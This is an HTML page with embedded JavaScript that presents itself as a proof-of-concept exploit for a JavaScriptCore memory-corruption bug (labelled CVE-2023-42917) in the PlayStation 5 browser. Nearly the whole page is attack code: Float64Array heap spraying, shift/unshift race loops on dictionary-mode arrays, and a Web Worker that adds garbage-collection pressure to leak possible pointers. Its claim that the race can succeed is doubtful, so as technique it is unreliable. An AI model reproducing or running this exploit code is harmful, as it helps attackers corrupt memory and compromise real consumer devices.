<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v41 - Butterfly Leak</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
pointer-events:none;z-index:9999}
#hd{position:fixed;top:0;left:0;right:0;height:44px;
background:linear-gradient(180deg,#0d0d0d,#080808);
border-bottom:1px solid #00ff41;display:flex;align-items:center;
padding:0 16px;gap:14px;z-index:10;font-size:12px}
.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
#out{position:fixed;top:46px;left:0;right:0;bottom:0;
padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
-webkit-user-select:text}
#out::-webkit-scrollbar{width:5px}
#out::-webkit-scrollbar-track{background:#001a06}
#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
</style>
</head>
<body>
<div id="hd">
<span class="l">▶ v41 BFLY</span><span class="s">│</span>
<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
<span class="v" id="h2">STAGE:<b>INIT</b></span><span class="s">│</span>
<span class="v" id="h3">LEAK:<b>?</b></span>
</div>
<div id="pg"><div id="bar" style="width:0%"></div></div>
<div id="out"></div>
<script>
"use strict";

// ============================================================
//  PS5 v41 — JSC Butterfly Leak (CVE-2023-42917)
//
//  ROOT CAUSE:
//  flattenDictionaryStructure() shrinks the butterfly.
//  Race: another reference keeps using the old, larger butterfly.
//
//  STRATEGY:
//  1. Create array in dictionary mode (sparse).
//  2. Save reference to a specific index.
//  3. Trigger flattenDictionaryStructure via shift().
//  4. Concurrently allocate TypedArrays to reclaim old butterfly.
//  5. Read the saved reference → might return TypedArray data!
//
//  KEY: We use Float64Array to spray. If the old butterfly
//  is reclaimed by a Float64Array, reading the old array index
//  will return a float64 value from our controlled buffer!
// ============================================================

var O=document.getElementById("out");
var bar=document.getElementById("bar");
function pg(p){bar.style.width=p+"%"}
function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
function P(m,c){var s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}

window.onerror=function(m,s,l){
  Fl("CRASH: "+m.substring(0,80)+" @"+l);
  St("CRASH = RACE HIT!");
  return true;
};

var ua=navigator.userAgent||"";
var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");

P("════════════════════════════════════","hd");
P("  v41 — Butterfly Leak","hd");
P("════════════════════════════════════","hd");
P("");

// Helper: float64 to hex
function f2h(f) {
  var buf = new ArrayBuffer(8);
  var f64 = new Float64Array(buf);
  var u32 = new Uint32Array(buf);
  f64[0] = f;
  return "0x" + u32[1].toString(16).padStart(8,"0") + u32[0].toString(16).padStart(8,"0");
}

// ============================================================
//  PHASE 1: Array Shift Race + Float64 Spray
// ============================================================
async function phase1() {
  hu("h2","STAGE:<b>RACE</b>");
  pg(20);Sep();Hd("PHASE 1: Array Shift Race + Float64 Spray");Sep();
  P("  Creating dictionary-mode arrays...","dm");

  var arrays = [];
  var refs = [];

  for (var i = 0; i < 100; i++) {
    var arr = [];
    // Fill with doubles to force Contiguous indexing
    for (var j = 0; j < 64; j++) arr[j] = j * 1.1 + 0.001 * i;
    // Force dictionary mode by adding a sparse element
    arr[1000] = 1234.5678;
    arrays.push(arr);
    // Save reference to element 10 (value = 10 * 1.1 = 11.0)
    refs.push(arr[10]);
  }
  Ok("100 arrays created");
  P("");

  var corrupted = 0;
  var leaked = [];

  // Spray Float64Arrays to reclaim freed butterflies
  var spray = [];
  for (var i = 0; i < 1000; i++) {
    var buf = new ArrayBuffer(64 * 8); // 512 bytes, larger than butterfly
    var view = new Float64Array(buf);
    // Fill with marker pattern
    for (var j = 0; j < 64; j++) view[j] = 1.337 + j * 0.001;
    spray.push(view);
  }
  Ok("1000 Float64Arrays sprayed");
  P("");

  for (var round = 0; round < 20; round++) {
    // GC pressure
    for (var j = 0; j < 500; j++) new ArrayBuffer(1024);

    // Shift all arrays (trigger flattenDictionaryStructure)
    for (var i = 0; i < arrays.length; i++) {
      try {
        arrays[i].shift();
      } catch(e) {}
    }

    // Check for corruption
    for (var i = 0; i < arrays.length; i++) {
      try {
        // After shift, element 10 should be old element 11 = 11 * 1.1 = 12.1
        var expected = 11 * 1.1 + 0.001 * i;
        var actual = arrays[i][10];
        
        if (actual !== expected && !isNaN(actual) && actual !== undefined) {
          corrupted++;
          if (corrupted <= 10) {
            Hi("CORRUPTION: arr["+i+"][10] = " + actual + " (0x" + f2h(actual) + ")");
            leaked.push(actual);
          }
        }
      } catch(e) {
        corrupted++;
        if (corrupted <= 10) Hi("ACCESS ERR: " + e.message);
      }
    }

    if (round % 5 === 0) {
      P("  Round "+round+"/20: corrupted="+corrupted, "dm");
      await new Promise(r => setTimeout(r, 20));
    }
  }

  P("");
  P("  Total corrupted: " + corrupted, corrupted > 0 ? "hl" : "dm");
  
  if (corrupted > 0) {
    St("BUTTERFLY CORRUPTION CONFIRMED!");
    P("  Leaked values (as float64):", "hl");
    for (var i = 0; i < leaked.length; i++) {
      P("    " + leaked[i] + " (hex: " + f2h(leaked[i]) + ")");
    }
  }
  
  return corrupted;
}

// ============================================================
//  PHASE 2: Worker-based Race (Intensive)
// ============================================================
async function phase2() {
  hu("h2","STAGE:<b>WORKER</b>");
  pg(50);Sep();Hd("PHASE 2: Worker-based Intensive Race");Sep();
  P("  Using Worker for concurrent GC pressure...","dm");
  P("");

  var workerCode = `
    var objs = [];
    var running = true;
    function loop() {
      if (!running) return;
      for (var i = 0; i < 100; i++) objs.push(new ArrayBuffer(256));
      if (objs.length > 5000) objs = [];
      postMessage(1);
    }
    setInterval(loop, 0);
  `;

  var worker;
  try {
    worker = new Worker(URL.createObjectURL(new Blob([workerCode])));
  } catch(e) {
    Fl("Worker failed: " + e.message);
    return 0;
  }

  var arrays = [];
  var refs = [];
  for (var i = 0; i < 100; i++) {
    var arr = [];
    for (var j = 0; j < 64; j++) arr[j] = j * 2.2 + 0.001 * i;
    arr[1000] = 5678.1234;
    arrays.push(arr);
    refs.push(arr[10]);
  }

  // Spray Float64Arrays
  var spray = [];
  for (var i = 0; i < 1000; i++) {
    var buf = new ArrayBuffer(512);
    var view = new Float64Array(buf);
    for (var j = 0; j < 64; j++) view[j] = 2.718 + j * 0.001;
    spray.push(view);
  }

  var corrupted = 0;
  var leaked = [];
  var msgCount = 0;

  worker.onmessage = function(e) { msgCount++; };

  for (var round = 0; round < 30; round++) {
    // Shift + unshift to trigger structure transitions
    for (var i = 0; i < arrays.length; i++) {
      try {
        arrays[i].shift();
        arrays[i].shift();
        arrays[i].unshift(0.123);
        arrays[i].unshift(0.456);
      } catch(e) {}
    }

    // Allocate on main thread too
    for (var j = 0; j < 200; j++) new ArrayBuffer(512);

    // Check for corruption
    for (var i = 0; i < arrays.length; i++) {
      try {
        // After 2 shifts + 2 unshifts, element 10 should be original element 10
        var expected = refs[i];
        var actual = arrays[i][10];
        
        if (actual !== expected && !isNaN(actual) && actual !== undefined) {
          corrupted++;
          if (corrupted <= 10) {
            Hi("WORKER CORRUPTION: arr["+i+"][10] = " + actual + " (0x" + f2h(actual) + ")");
            leaked.push(actual);
          }
        }
      } catch(e) {
        corrupted++;
        if (corrupted <= 10) Hi("ACCESS ERR: " + e.message);
      }
    }

    if (round % 5 === 0) {
      P("  Round "+round+"/30: corrupted="+corrupted+" msgs="+msgCount, "dm");
      await new Promise(r => setTimeout(r, 50));
    }
  }

  worker.terminate();
  P("");
  P("  Worker race corrupted: " + corrupted, corrupted > 0 ? "hl" : "dm");

  if (corrupted > 0) {
    St("WORKER RACE LEAK CONFIRMED!");
    P("  Leaked values (as float64):", "hl");
    for (var i = 0; i < leaked.length; i++) {
      P("    " + leaked[i] + " (hex: " + f2h(leaked[i]) + ")");
    }
  }

  return corrupted;
}

// ============================================================
//  MAIN
// ============================================================
async function main() {
  await new Promise(r => setTimeout(r, 200));

  var total1 = await phase1();
  await new Promise(r => setTimeout(r, 100));

  var total2 = await phase2();

  pg(100);Sep();Hd("FINAL SUMMARY");Sep();
  P("");
  P("  Phase 1 (Shift Race):   " + total1 + " corrupted");
  P("  Phase 2 (Worker Race):  " + total2 + " corrupted");
  P("");

  if (total1 + total2 > 0) {
    St("★ CVE-2023-42917 BUTTERFLY LEAK ★");
    P("  JSC memory corruption confirmed!", "hl");
    P("  Leaked float64 values may contain pointers!", "hl");
    hu("h3","LEAK:<b>FOUND!</b>");
  } else {
    P("  No corruption detected.", "dm");
    P("  The bug may be patched or timing differs.", "dm");
    hu("h3","LEAK:<b>NONE</b>");
  }
  hu("h2","STAGE:<b>DONE</b>");
}

setTimeout(main, 100);

</script>
</body>
</html>
